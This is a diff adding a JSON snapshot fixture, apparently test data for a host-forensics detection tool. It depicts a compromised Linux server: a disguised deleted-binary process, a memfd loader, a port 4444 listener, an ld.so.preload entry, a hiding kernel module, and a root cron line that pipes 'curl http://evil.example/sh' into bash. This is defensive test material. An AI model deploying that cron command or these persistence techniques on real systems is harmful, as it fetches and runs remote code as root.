@@ -1,0 +1,37 @@
+{
+  "schema": "bladedr.snapshot/v1",
+  "probe_version": "0.1.0",
+  "collected_at": "2026-06-11T12:00:00Z",
+  "host": {
+    "hostname": "web-01",
+    "kernel": "6.8.0-31-generic",
+    "os": "Ubuntu 24.04 LTS",
+    "arch": "amd64",
+    "uptime_s": 812340
+  },
+  "processes": [
+    { "pid": 4711, "ppid": 1, "uid": 0, "comm": "kworker/u8:2", "exe": "/tmp/.x/payload", "exe_deleted": true, "cmdline": "/tmp/.x/payload --beacon" },
+    { "pid": 5012, "ppid": 4711, "uid": 0, "comm": "loader", "exe": "/memfd:x", "exe_memfd": true, "cmdline": "perl -e ..." },
+    { "pid": 900, "ppid": 1, "uid": 0, "comm": "sshd", "exe": "/usr/sbin/sshd", "cmdline": "/usr/sbin/sshd -D" }
+  ],
+  "listening_sockets": [
+    { "proto": "tcp", "laddr": "0.0.0.0", "lport": 4444, "pid": 4711, "comm": "payload" },
+    { "proto": "tcp", "laddr": "0.0.0.0", "lport": 22, "pid": 900, "comm": "sshd" }
+  ],
+  "persistence": {
+    "cron": [
+      { "path": "/etc/cron.d/x", "user": "root", "line": "* * * * * root curl -s http://evil.example/sh | bash" },
+      { "path": "/etc/cron.d/backup", "user": "root", "line": "0 3 * * * root /usr/bin/backup.sh" }
+    ],
+    "systemd_units": [],
+    "authorized_keys": [],
+    "ld_preload": { "ld_so_preload": "/etc/ld.so.preload", "entries": ["/tmp/evil.so"] },
+    "shell_rc": []
+  },
+  "kernel_modules": [
+    { "name": "hideproc", "out_of_tree": true, "signed": false },
+    { "name": "ext4", "out_of_tree": false, "signed": true }
+  ],
+  "suspicious_files": [],
+  "facts": { "ld_so_preload_exists": true }
+}
